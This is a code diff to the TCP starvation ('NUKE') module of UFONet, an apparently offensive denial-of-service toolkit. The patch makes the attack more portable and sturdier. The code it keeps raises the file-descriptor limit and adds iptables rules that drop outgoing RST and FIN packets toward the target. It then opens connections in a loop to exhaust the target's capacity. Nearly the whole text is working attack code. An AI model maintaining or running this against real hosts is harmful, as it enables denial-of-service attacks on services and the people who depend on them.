@@ -9,7 +9,7 @@ You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import socket, select, os, time, resource
+import sys, socket, select, os, time
 from urllib.parse import urlparse
 
 # UFONet TCP Starvation (NUKE)
@@ -22,10 +22,17 @@ def connect(ip, port):
 def nukeize(ip, port, rounds):
     n=0
     try: # RFC793 will lacks an exception if reset is not sent
-        resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000)) # modify kernel ulimit to: 100000
-        os.system("iptables -A OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP"%(ip, port)) # modify IPTABLES
-        os.system("iptables -A OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP"%(ip, port))
-        epoll = select.epoll()
+        if sys.platform.startswith("linux"):
+            import resource
+            try:
+                resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000)) # modify kernel ulimit to: 100000
+            except (ValueError, OSError):
+                pass
+            os.system("iptables -A OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP"%(ip, port)) # modify IPTABLES
+            os.system("iptables -A OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP"%(ip, port))
+            epoll = select.epoll()
+        else:
+            epoll = None
         connections = {}
         for x in range (0,int(rounds)):
             try:
@@ -33,12 +40,14 @@ def nukeize(ip, port, rounds):
                 s = connect(ip, port)
                 print("[Info] [AI] [NUKE] Firing 'nuke' ["+str(n)+"] -> [SHOCKING!]")
                 connections[s.fileno()] = s 
-                epoll.register(s.fileno(), select.EPOLLOUT|select.EPOLLONESHOT)
-            except:
+                if epoll:
+                    epoll.register(s.fileno(), select.EPOLLOUT|select.EPOLLONESHOT)
+            except Exception:
                 print("[Error] [AI] [NUKE] Failed to engage with 'nuke' ["+str(n)+"]")
-        os.system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP' %(ip, port)) # restore IPTABLES
-        os.system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP' %(ip, port))
-    except:
+        if sys.platform.startswith("linux"):
+            os.system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP' %(ip, port)) # restore IPTABLES
+            os.system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP' %(ip, port))
+    except Exception:
         print("[Error] [AI] [NUKE] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class NUKE(object):
